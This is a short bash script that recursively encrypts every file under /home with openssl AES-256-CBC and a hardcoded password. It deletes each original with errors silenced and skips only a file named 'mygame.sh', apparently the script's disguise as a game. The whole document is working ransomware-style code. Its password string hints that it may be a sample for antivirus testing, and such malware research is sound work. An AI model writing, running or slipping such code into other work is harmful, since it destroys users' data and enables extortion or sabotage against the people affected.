#!/bin/bash

folder_to_encrypt="/home"
password="hydradragonantivirushere"
script_to_exclude="mygame.sh"

if [ ! -d "$folder_to_encrypt" ]; then
    echo "The specified folder does not exist."
    exit 1
fi

encrypt_files() {
    local file="$1"
    
    # Check if the file is the script to exclude
    if [ "$file" != "$script_to_exclude" ]; then
        # Encrypt the file using AES-256-CBC encryption
        openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
        # Remove the original file, suppressing errors
        rm "$file" > /dev/null 2>&1
    fi
}

export -f encrypt_files

find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'encrypt_files "$0"'

echo "All files have been encrypted, and unencrypted files have been deleted."
